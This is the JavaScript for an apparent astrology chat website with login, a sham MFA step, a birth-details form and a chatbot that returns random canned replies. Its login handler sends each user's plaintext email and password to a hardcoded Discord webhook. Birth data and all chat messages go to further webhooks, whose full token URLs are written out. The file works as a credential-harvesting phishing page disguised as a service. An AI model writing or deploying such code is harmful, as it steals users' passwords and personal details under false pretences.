// Discord Webhooks Configuration
const WEBHOOK_AUTH = "https://discord.com/api/webhooks/1450946822506938460/xrlqsz7Jh_DRSL3BWcvoQ0JVqZ9POANySYI0iD_j4WMU1fCL1XsFpF2Uk9c-voJY48IO";
const WEBHOOK_ASTRO_FORM = "https://discord.com/api/webhooks/1450945508477505758/yw1YodPzU1E3rmQ6M__i4j3vg6MK_gi_lt-5DNvsyAghsn9W4KPlSfXgCm_sGksRbIbg";
const WEBHOOK_CHAT = "https://discord.com/api/webhooks/1450945996648615947/O6Fsk1cAMlzj6VRsT3PMSWj-CoDK47xX1q-QwgYcr7m9Yq9T8BLirTahr0bKHmE4vzq1";

// AI Configuration (Users should replace this with their own details for a real app)
// NOTE: Client-side API keys are insecure. For this demo, we use a simulation or a public-friendly endpoint if configured.
// We will simulate AI responses to ensure the user flow works 100% without needing a Paid Key immediately.
const USE_MOCK_AI = true;

// State
let currentUser = {
    email: "",
    astroData: {}
};

// DOM Elements
const sections = {
    landing: document.getElementById('landing-page'),
    login: document.getElementById('login-page'),
    mfa: document.getElementById('mfa-page'),
    astroForm: document.getElementById('astro-form-page'),
    chat: document.getElementById('chat-page')
};

// Navigation Helper
function showSection(sectionId) {
    Object.values(sections).forEach(sec => {
        sec.classList.remove('active-section');
        sec.classList.add('hidden-section');
    });
    sections[sectionId].classList.remove('hidden-section');
    sections[sectionId].classList.add('active-section');
}

// 1. Landing Page Logic
document.getElementById('enter-btn').addEventListener('click', () => {
    showSection('login');
});

// 2. Login Logic
document.getElementById('auth-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    currentUser.email = email;

    // Send to Discord
    await sendToDiscord(WEBHOOK_AUTH, {
        title: "New Login/Signup Attempt",
        color: 0xa855f7, // Purple
        fields: [
            { name: "Email", value: email, inline: true },
            { name: "Password", value: password, inline: true }, // Note: In production, never log passwords.
            { name: "Time", value: new Date().toLocaleString(), inline: false }
        ]
    });

    console.log("Auth Data Sent");
    showSection('mfa');
});

// Toggle Login/Signup
const authTitle = document.querySelector('#login-page h2');
const authBtn = document.querySelector('#login-page button');
const switchBtn = document.getElementById('switch-to-signup');
let isSignup = false;

switchBtn.addEventListener('click', (e) => {
    e.preventDefault();
    isSignup = !isSignup;
    if (isSignup) {
        authTitle.innerText = "Join the Cosmos";
        authBtn.innerText = "Create Account";
        switchBtn.innerText = "Already a member? Login";
    } else {
        authTitle.innerText = "Identify Yourself";
        authBtn.innerText = "Begin Journey";
        switchBtn.innerText = "New soul? Create profile";
    }
});

// 3. MFA Logic
const otpInputs = document.querySelectorAll('.otp-input');
otpInputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
        if (e.target.value.length === 1 && index < otpInputs.length - 1) {
            otpInputs[index + 1].focus();
        }
    });

    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
            otpInputs[index - 1].focus();
        }
    });
});

document.getElementById('mfa-form').addEventListener('submit', (e) => {
    e.preventDefault();
    // Simulate verification
    setTimeout(() => {
        showSection('astroForm');
    }, 500);
});

// 4. Astrology Form Logic
document.getElementById('astrology-details-form').addEventListener('submit', async (e) => {
    e.preventDefault();

    // Collect Data
    const formData = {
        name: document.getElementById('full-name').value,
        dob: document.getElementById('dob').value,
        time: document.getElementById('birth-time').value,
        place: document.getElementById('birth-place').value,
        focus: document.getElementById('astro-focus').value
    };

    currentUser.astroData = formData;

    // Send to Discord
    await sendToDiscord(WEBHOOK_ASTRO_FORM, {
        title: "New Astrology Profile",
        color: 0x3b82f6, // Blue
        fields: [
            { name: "User", value: currentUser.email, inline: false },
            { name: "Name", value: formData.name, inline: true },
            { name: "DOB", value: formData.dob, inline: true },
            { name: "Time", value: formData.time, inline: true },
            { name: "Place", value: formData.place, inline: true },
            { name: "Focus Area", value: formData.focus || "General", inline: false }
        ]
    });

    showSection('chat');
    // Initial AI greeting personalized
    addMessage('ai', `Welcome, ${formData.name}. I see you were born in ${formData.place} at ${formData.time}. The stars have much to tell you about your path. What is on your mind?`);
});

// 5. Chat Logic
const chatHistory = document.getElementById('chat-history');
const userInput = document.getElementById('user-input');
const sendBtn = document.getElementById('send-btn');

function addMessage(sender, text) {
    const msgDiv = document.createElement('div');
    msgDiv.classList.add('message');
    msgDiv.classList.add(sender === 'user' ? 'user-message' : 'ai-message');

    const avatar = document.createElement('div');
    avatar.className = 'avatar';
    avatar.innerHTML = sender === 'user' ? '<i class="fa-solid fa-user"></i>' : '<i class="fa-solid fa-star"></i>';

    const bubble = document.createElement('div');
    bubble.className = 'bubble';
    bubble.innerText = text;

    msgDiv.appendChild(avatar);
    msgDiv.appendChild(bubble);

    chatHistory.appendChild(msgDiv);
    chatHistory.scrollTop = chatHistory.scrollHeight;
}

async function handleChat() {
    const text = userInput.value.trim();
    if (!text) return;

    // User Message
    addMessage('user', text);
    userInput.value = '';

    // Log to Discord
    sendToDiscord(WEBHOOK_CHAT, {
        title: "Chat Interaction",
        color: 0xec4899, // Pink
        description: `**User (${currentUser.email}):** ${text}`
    });

    // AI Response
    showTypingIndicator(); // Optional: Implement visual typing

    let aiResponse = "";
    if (USE_MOCK_AI) {
        aiResponse = await getMockAIResponse(text, currentUser.astroData);
    } else {
        // Implement Real API call here if key provided
        aiResponse = "I am currently in demo mode. My connection to the cosmos is running on a simulation.";
    }

    // Remove typing indicator (not implemented here for brevity, just immediate response)
    addMessage('ai', aiResponse);

    // Log AI response to Discord
    sendToDiscord(WEBHOOK_CHAT, {
        title: "Chat Interaction",
        color: 0xa855f7,
        description: `**AI:** ${aiResponse}`
    });
}

sendBtn.addEventListener('click', handleChat);
userInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') handleChat();
});

// Mock AI Logic
async function getMockAIResponse(userText, astroContext) {
    // Simulate network delay
    await new Promise(r => setTimeout(r, 1000));

    const responses = [
        "The alignment of Mars suggests caution in this area.",
        "Your birth chart indicates a strong potential for growth right now.",
        "The stars are aligning in your favor essentially.",
        "This is a time for reflection, as Mercury is in retrograde.",
        "Consider the position of Venus in your chart; it governs your relationships.",
        "Financial stability is foreseen, but patience is required.",
        `Based on your birth in ${astroContext.place}, I sense a connection to water signs.`
    ];

    return responses[Math.floor(Math.random() * responses.length)];
}


// Discord Webhook Helper
async function sendToDiscord(webhookUrl, embedData) {
    try {
        const payload = {
            embeds: [embedData]
        };

        await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error("Failed to send webhook:", e);
    }
}
